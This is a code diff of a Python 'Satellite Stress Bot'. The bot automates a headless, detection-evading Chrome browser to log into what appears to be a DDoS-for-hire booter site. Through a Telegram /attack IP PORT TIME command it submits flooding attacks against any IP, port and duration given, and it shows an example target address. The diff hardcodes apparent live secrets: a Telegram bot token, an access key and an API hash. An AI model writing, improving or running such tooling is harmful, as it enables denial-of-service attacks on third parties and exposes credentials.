@@ -13,12 +13,15 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
 from webdriver_manager.chrome import ChromeDriverManager
-from pyrogram import Client, filters
-from pyrogram.types import Message
 from pyvirtualdisplay import Display
 import logging
+import asyncio
 
-# ==================== CONFIGURATION ====================
+# Use python-telegram-bot instead of pyrogram (more stable)
+from telegram import Update, Bot
+from telegram.ext import Application, CommandHandler, ContextTypes
+
+# ==================== CONFIG ====================
 TELEGRAM_BOT_TOKEN = "8739857934:AAFC8icETbmsxjYIqxcOmF8MHD_xg7xHZdo"
 ACCESS_KEY = "2d1139b0c49e3019b0a54a5f6e60062957db4353b4daf6259b8a2752276d26b4"
 LOGIN_URL = "https://satellitestress.st/login"
@@ -47,27 +50,31 @@ class BrowserManager:
         """Start browser"""
         logger.info("🚀 Starting browser...")
         
-        # Virtual display for headless servers
-        self.display = Display(visible=0, size=(1920, 1080))
-        self.display.start()
-        
-        # Chrome options
-        options = Options()
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--headless=new")
-        options.add_argument("--window-size=1920,1080")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        
-        # Start driver
-        service = Service(ChromeDriverManager().install())
-        self.driver = webdriver.Chrome(service=service, options=options)
-        logger.info("✅ Browser started")
-        
-        # Load saved session if exists
-        self.load_session()
+        try:
+            # Virtual display for headless servers
+            self.display = Display(visible=0, size=(1920, 1080))
+            self.display.start()
+            
+            # Chrome options
+            options = Options()
+            options.add_argument("--no-sandbox")
+            options.add_argument("--disable-dev-shm-usage")
+            options.add_argument("--disable-gpu")
+            options.add_argument("--headless=new")
+            options.add_argument("--window-size=1920,1080")
+            options.add_argument("--disable-blink-features=AutomationControlled")
+            options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            
+            # Start driver
+            service = Service(ChromeDriverManager().install())
+            self.driver = webdriver.Chrome(service=service, options=options)
+            logger.info("✅ Browser started")
+            
+            # Load saved session if exists
+            self.load_session()
+            
+        except Exception as e:
+            logger.error(f"Browser start error: {e}")
         
     def load_session(self):
         """Load saved cookies"""
@@ -75,8 +82,17 @@ class BrowserManager:
             if os.path.exists(COOKIES_FILE):
                 with open(COOKIES_FILE, 'rb') as f:
                     cookies = pickle.load(f)
+                
+                # Go to domain first to set cookies
+                self.driver.get(LOGIN_URL)
+                time.sleep(2)
+                
                 for cookie in cookies:
-                    self.driver.add_cookie(cookie)
+                    try:
+                        self.driver.add_cookie(cookie)
+                    except:
+                        pass
+                
                 logger.info("✅ Session loaded")
                 self.check_login()
         except Exception as e:
@@ -98,13 +114,16 @@ class BrowserManager:
         """Check if logged in"""
         try:
             self.driver.get(ATTACK_URL)
-            time.sleep(2)
-            if "attack" in self.driver.current_url:
+            time.sleep(3)
+            
+            if "attack" in self.driver.current_url or "dashboard" in self.driver.current_url:
                 self.is_logged_in = True
                 self.login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                logger.info("✅ Already logged in")
                 return True
-        except:
-            pass
+        except Exception as e:
+            logger.error(f"Check login error: {e}")
+        
         self.is_logged_in = False
         return False
     
@@ -112,98 +131,155 @@ class BrowserManager:
         """Launch attack"""
         try:
             self.driver.get(ATTACK_URL)
-            time.sleep(2)
+            time.sleep(3)
             
-            # Fill form
-            ip_input = WebDriverWait(self.driver, 10).until(
+            # Wait for form
+            WebDriverWait(self.driver, 10).until(
                 EC.presence_of_element_located((By.NAME, "ip"))
             )
+            
+            # Fill form
+            ip_input = self.driver.find_element(By.NAME, "ip")
             ip_input.clear()
             ip_input.send_keys(ip)
             
-            self.driver.find_element(By.NAME, "port").send_keys(str(port))
-            self.driver.find_element(By.NAME, "time").send_keys(str(duration))
+            port_input = self.driver.find_element(By.NAME, "port")
+            port_input.clear()
+            port_input.send_keys(str(port))
+            
+            time_input = self.driver.find_element(By.NAME, "time")
+            time_input.clear()
+            time_input.send_keys(str(duration))
             
             # Submit
-            self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
-            time.sleep(2)
+            submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+            submit_btn.click()
+            time.sleep(3)
+            
             logger.info(f"✅ Attack sent to {ip}:{port}")
             return True
+            
         except Exception as e:
             logger.error(f"Attack error: {e}")
             return False
 
-# ==================== TELEGRAM BOT ====================
-class TelegramHandler:
+# ==================== TELEGRAM BOT (using python-telegram-bot) ====================
+class TelegramBot:
     def __init__(self, browser):
         self.browser = browser
-        self.app = Client(
-            "satellite_bot",
-            bot_token=TELEGRAM_BOT_TOKEN,
-            api_id=2040,
-            api_hash="b18441a1ff607e10a989891a5462e627"
-        )
-        self.setup_handlers()
+        self.application = None
     
-    def setup_handlers(self):
-        @self.app.on_message(filters.command("start"))
-        async def start_cmd(client, message):
-            await message.reply_text(
-                "🚀 **Satellite Stress Bot**\n\n"
-                "✅ Python version running on Render\n"
-                f"🌐 Web: {RENDER_URL}\n\n"
-                "Commands:\n"
-                "/status - Check login\n"
-                "/attack IP PORT TIME - Launch attack\n"
-                "/help - Show help"
+    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await update.message.reply_text(
+            "🚀 **Satellite Stress Bot**\n\n"
+            "✅ Running on Render\n"
+            f"🌐 Web: {RENDER_URL}\n\n"
+            "**Commands:**\n"
+            "/status - Check login\n"
+            "/attack IP PORT TIME - Launch attack\n"
+            "/help - Show help",
+            parse_mode="Markdown"
+        )
+    
+    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await update.message.reply_text(
+            "📚 **Usage:**\n\n"
+            "1. Open web interface and login\n"
+            "2. Save session\n"
+            "3. Use attack command\n\n"
+            "**Example:**\n"
+            "`/attack 104.29.138.132 80 120`\n\n"
+            f"**Access Key:** `{ACCESS_KEY}`",
+            parse_mode="Markdown"
+        )
+    
+    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        self.browser.check_login()
+        
+        text = f"📊 **Status:**\n\n"
+        text += f"• Login: {'✅ LOGGED IN' if self.browser.is_logged_in else '❌ NOT LOGGED IN'}\n"
+        text += f"• Session: {'✅ SAVED' if os.path.exists(COOKIES_FILE) else '❌ NOT SAVED'}\n"
+        text += f"• Last Login: {self.browser.login_time or 'Never'}"
+        
+        await update.message.reply_text(text, parse_mode="Markdown")
+    
+    async def attack_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not self.browser.is_logged_in:
+            await update.message.reply_text(
+                "❌ **Not Logged In**\n\n"
+                f"Please login via web interface first:\n{RENDER_URL}",
+                parse_mode="Markdown"
             )
+            return
         
-        @self.app.on_message(filters.command("help"))
-        async def help_cmd(client, message):
-            await message.reply_text(
-                "📚 **Usage:**\n\n"
-                "1. Open web interface and login\n"
-                "2. Save session\n"
-                "3. Use attack command\n\n"
-                f"Example:\n`/attack 104.29.138.132 80 120`"
+        if len(context.args) < 3:
+            await update.message.reply_text(
+                "❌ **Invalid Format**\n\n"
+                "Usage: /attack IP PORT TIME\n"
+                "Example: /attack 104.29.138.132 80 120",
+                parse_mode="Markdown"
             )
+            return
         
-        @self.app.on_message(filters.command("status"))
-        async def status_cmd(client, message):
-            self.browser.check_login()
-            text = f"📊 **Status:**\n\n"
-            text += f"Login: {'✅' if self.browser.is_logged_in else '❌'}\n"
-            text += f"Session: {'✅' if os.path.exists(COOKIES_FILE) else '❌'}\n"
-            text += f"Time: {self.browser.login_time or 'Never'}"
-            await message.reply_text(text)
+        ip = context.args[0]
+        port = context.args[1]
+        duration = context.args[2]
         
-        @self.app.on_message(filters.command("attack"))
-        async def attack_cmd(client, message):
-            if not self.browser.is_logged_in:
-                await message.reply_text("❌ Not logged in. Login via web first.")
-                return
-            
-            parts = message.text.split()
-            if len(parts) < 4:
-                await message.reply_text("❌ Use: /attack IP PORT TIME")
-                return
-            
-            ip, port, duration = parts[1], parts[2], parts[3]
-            
-            # Validate
-            if not re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
-                await message.reply_text("❌ Invalid IP")
-                return
-            
-            await message.reply_text(f"🚀 Attacking {ip}:{port} for {duration}s...")
-            
-            if self.browser.attack(ip, port, duration):
-                await message.reply_text("✅ Attack launched!")
-            else:
-                await message.reply_text("❌ Attack failed")
+        # Validate IP
+        if not re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
+            await update.message.reply_text("❌ Invalid IP address")
+            return
+        
+        # Validate port
+        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
+            await update.message.reply_text("❌ Port must be 1-65535")
+            return
+        
+        # Validate duration
+        if not duration.isdigit() or int(duration) < 1:
+            await update.message.reply_text("❌ Duration must be positive number")
+            return
+        
+        await update.message.reply_text(
+            f"🚀 **Launching Attack...**\n\n"
+            f"Target: `{ip}`\n"
+            f"Port: `{port}`\n"
+            f"Duration: `{duration}s`",
+            parse_mode="Markdown"
+        )
+        
+        # Execute attack in thread to not block
+        def do_attack():
+            return self.browser.attack(ip, port, duration)
+        
+        success = await asyncio.get_event_loop().run_in_executor(None, do_attack)
+        
+        if success:
+            await update.message.reply_text(
+                f"✅ **Attack Launched!**\n\n"
+                f"`{ip}:{port}` for {duration} seconds",
+                parse_mode="Markdown"
+            )
+        else:
+            await update.message.reply_text("❌ Attack failed. Please try again.")
+    
+    def setup(self):
+        """Setup bot application"""
+        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+        
+        # Add handlers
+        self.application.add_handler(CommandHandler("start", self.start_command))
+        self.application.add_handler(CommandHandler("help", self.help_command))
+        self.application.add_handler(CommandHandler("status", self.status_command))
+        self.application.add_handler(CommandHandler("attack", self.attack_command))
+        
+        return self.application
     
     def run(self):
-        self.app.run()
+        """Run bot"""
+        self.setup()
+        logger.info("🤖 Telegram bot started")
+        self.application.run_polling()
 
 # ==================== HTML TEMPLATE ====================
 HTML = """
@@ -383,25 +459,32 @@ HTML = """
             btn.textContent = '💾 Saving...';
             btn.disabled = true;
             
-            const res = await fetch('/save-session', {method: 'POST'});
-            const data = await res.json();
-            
-            alert(data.success ? '✅ Session saved!' : '❌ ' + data.message);
-            checkStatus();
-            
-            btn.textContent = '💾 Save Session';
-            btn.disabled = false;
+            try {
+                const res = await fetch('/save-session', {method: 'POST'});
+                const data = await res.json();
+                alert(data.success ? '✅ Session saved!' : '❌ ' + data.message);
+            } catch (e) {
+                alert('❌ Error: ' + e.message);
+            } finally {
+                btn.textContent = '💾 Save Session';
+                btn.disabled = false;
+                checkStatus();
+            }
         }
         
         async function checkStatus() {
-            const res = await fetch('/status');
-            const data = await res.json();
-            
-            document.getElementById('loginText').textContent = data.is_logged_in ? 'Logged In' : 'Not Logged In';
-            document.getElementById('loginBadge').textContent = data.is_logged_in ? 'ACTIVE' : 'INACTIVE';
-            document.getElementById('loginBadge').className = 'badge ' + (data.is_logged_in ? 'badge-success' : 'badge-warning');
-            document.getElementById('sessionText').textContent = data.session_exists ? '✅ Saved' : '❌ Not Saved';
-            document.getElementById('loginTime').textContent = data.login_time || 'Never';
+            try {
+                const res = await fetch('/status');
+                const data = await res.json();
+                
+                document.getElementById('loginText').textContent = data.is_logged_in ? 'Logged In' : 'Not Logged In';
+                document.getElementById('loginBadge').textContent = data.is_logged_in ? 'ACTIVE' : 'INACTIVE';
+                document.getElementById('loginBadge').className = 'badge ' + (data.is_logged_in ? 'badge-success' : 'badge-warning');
+                document.getElementById('sessionText').textContent = data.session_exists ? '✅ Saved' : '❌ Not Saved';
+                document.getElementById('loginTime').textContent = data.login_time || 'Never';
+            } catch (e) {
+                console.error(e);
+            }
         }
         
         setInterval(checkStatus, 5000);
@@ -442,15 +525,18 @@ def save_session():
 
 # ==================== MAIN ====================
 def run_flask():
-    app.run(host='0.0.0.0', port=PORT)
+    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
 
 def run_telegram():
-    telegram = TelegramHandler(browser)
-    telegram.run()
+    try:
+        bot = TelegramBot(browser)
+        bot.run()
+    except Exception as e:
+        logger.error(f"Telegram bot error: {e}")
 
 if __name__ == '__main__':
     print("="*50)
-    print("🚀 Starting Satellite Stress Bot (Python)")
+    print("🚀 Starting Satellite Stress Bot")
     print("="*50)
     
     # Start browser
@@ -462,5 +548,5 @@ if __name__ == '__main__':
     flask_thread.daemon = True
     flask_thread.start()
     
-    # Start Telegram bot (blocking)
+    # Run Telegram bot (blocking)
     run_telegram()
